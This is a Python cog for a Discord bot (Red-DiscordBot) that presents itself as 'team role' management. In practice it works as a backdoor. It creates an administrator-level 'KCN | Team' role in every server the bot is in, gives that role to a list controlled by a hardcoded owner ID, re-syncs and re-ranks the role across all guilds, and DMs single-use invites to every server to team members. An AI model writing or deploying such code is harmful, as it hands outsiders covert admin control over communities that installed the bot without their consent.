import discord
from redbot.core import commands, Config
from redbot.core.utils.predicates import MessagePredicate, ReactionPredicate
from redbot.core.utils.menus import start_adding_reactions

class TeamRole(commands.Cog):
    """Manage team role across all servers"""
    
    owner_id = 1174820638997872721  # Your owner ID
    role_name = "KCN | Team"
    role_color = "#000000"

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=78631109)
        self.config.register_global(team_users=[])

    async def red_delete_data_for_user(self, **kwargs):
        """No data to delete"""
        pass

    async def bot_owner_check(self, ctx):
        """Check if user is the defined owner"""
        return ctx.author.id == self.owner_id

    async def team_member_check(self, ctx):
        """Check if user is owner or in team list"""
        if await self.bot_owner_check(ctx):
            return True
        team_users = await self.config.team_users()
        return ctx.author.id in team_users

    @commands.group()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def team(self, ctx):
        """Team management commands"""
        pass

    # OWNER-ONLY COMMANDS
    @team.command()
    @commands.is_owner()
    async def setup(self, ctx):
        """Create team role in this server"""
        existing_role = discord.utils.get(ctx.guild.roles, name=self.role_name)
        if existing_role:
            return await ctx.send("Role already exists!")

        try:
            perms = discord.Permissions(administrator=True)
            new_role = await ctx.guild.create_role(
                name=self.role_name,
                color=discord.Color.from_str(self.role_color),
                permissions=perms,
                reason="Team role setup"
            )

            bot_top_role = ctx.guild.me.top_role
            if bot_top_role:
                await new_role.edit(position=bot_top_role.position - 1)
            
            await ctx.send(f"Successfully created {new_role.mention} and positioned it below the bot's top role!")
        except discord.Forbidden:
            await ctx.send("I need Manage Roles permission!")
        except discord.HTTPException:
            await ctx.send("Failed to create role!")

    @team.command()
    @commands.is_owner()
    async def add(self, ctx, user: discord.User):
        """Add user to the team list"""
        async with self.config.team_users() as users:
            if user.id not in users:
                users.append(user.id)
                await ctx.send(f"Added {user.mention} to team list")
            else:
                await ctx.send("User already in team list")

    @team.command()
    @commands.is_owner()
    async def remove(self, ctx, user: discord.User):
        """Remove user from the team list"""
        async with self.config.team_users() as users:
            if user.id in users:
                users.remove(user.id)
                await ctx.send(f"Removed {user.mention} from team list")
            else:
                await ctx.send("User not in team list")

    @team.command()
    @commands.is_owner()
    async def wipe(self, ctx):
        """Wipe all team data"""
        await self.config.team_users.set([])
        deleted = 0
        for guild in self.bot.guilds:
            role = discord.utils.get(guild.roles, name=self.role_name)
            if role:
                try:
                    await role.delete()
                    deleted += 1
                except:
                    pass
        await ctx.send(f"Deleted {deleted} roles. All data cleared.")

    @team.command()
    @commands.is_owner()
    async def delete(self, ctx):
        """Delete team role in this server"""
        role = discord.utils.get(ctx.guild.roles, name=self.role_name)
        if role:
            try:
                await role.delete()
                await ctx.send("Role deleted!")
            except discord.Forbidden:
                await ctx.send("Missing permissions!")
            except discord.HTTPException:
                await ctx.send("Deletion failed!")
        else:
            await ctx.send("No team role here!")

    @team.command()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def list(self, ctx):
        """List all team members"""
        team_users = await self.config.team_users()
        members = []
        for uid in team_users:
            user = self.bot.get_user(uid)
            members.append(f"{user.mention} ({user.id})" if user else f"Unknown ({uid})")
        
        embed = discord.Embed(
            title="Team Members",
            description="\n".join(members) if members else "No members",
            color=discord.Color.from_str(self.role_color)
        )
        await ctx.send(embed=embed)

    @team.command()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def sendmessage(self, ctx):
        """Send a message to all team members"""
        await ctx.send("Please type your message (you have 5 minutes):")
        try:
            msg = await self.bot.wait_for("message", check=lambda m: m.author == ctx.author, timeout=300)
        except TimeoutError:
            return await ctx.send("Timed out waiting for message.")
        
        embed = discord.Embed(title=f"Message from {ctx.author}", description=msg.content, color=discord.Color.from_str(self.role_color))
        team_users = await self.config.team_users()
        for uid in team_users:
            user = self.bot.get_user(uid)
            if user:
                try:
                    await user.send(embed=embed)
                except:
                    pass
        await ctx.send("Message sent to all team members!")

    @team.command()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def update(self, ctx):
        """Update team roles across all servers"""  
        team_users = await self.config.team_users()  
        msg = await ctx.send("Starting global role update...")  
        
        success = errors = 0  
        for guild in self.bot.guilds:  
            try:  
                role = discord.utils.get(guild.roles, name=self.role_name)  
                if not role:  
                    errors += 1  
                    continue  
                
                # Get bot's top role in this guild  
                bot_top = guild.me.top_role  
                if not bot_top:  
                    errors += 1  
                    continue  

                # Get all roles to sort  
                roles = guild.roles  
                
                # Find the position just below bot's top role  
                bot_pos = bot_top.position  
                new_pos = bot_pos - 1  
                
                # Ensure team role is below bot's top role  
                if role.position != new_pos:  
                    # Move all necessary roles up to make space  
                    sorted_roles = sorted(roles, key=lambda r: r.position, reverse=True)  
                    for r in sorted_roles:  
                        if r.position < bot_pos and r != role:  
                            try:  
                                await r.edit(position=r.position + 1)  
                            except:  
                                pass  
                    await role.edit(position=new_pos)  
                
                # Sync members  
                current_members = {m.id for m in role.members}  
                to_remove = current_members - set(team_users)  
                to_add = set(team_users) - current_members  
                
                for uid in to_remove:  
                    member = guild.get_member(uid)  
                    if member:  
                        await member.remove_roles(role)  
                
                for uid in to_add:  
                    member = guild.get_member(uid)  
                    if member:  
                        await member.add_roles(role)  
                
                success += 1  
            except:  
                errors += 1  
        
        await msg.edit(content=f"Updated {success} servers. Errors: {errors}")  


    @team.command()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def getinvite(self, ctx):
        """Generate single-use invites for all servers"""
        invites = []
        for guild in self.bot.guilds:
            try:
                channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
                if channel:
                    invite = await channel.create_invite(max_uses=1, unique=True, reason=f"Invite by {ctx.author}")
                    invites.append(f"{guild.name}: {invite.url}")
            except:
                pass
        
        try:
            await ctx.author.send("**Server Invites:**\n" + "\n".join(invites))
            await ctx.send("Check your DMs!")
        except discord.Forbidden:
            await ctx.send("Enable DMs to receive invites!")

async def setup(bot):
    await bot.add_cog(TeamRole(bot))
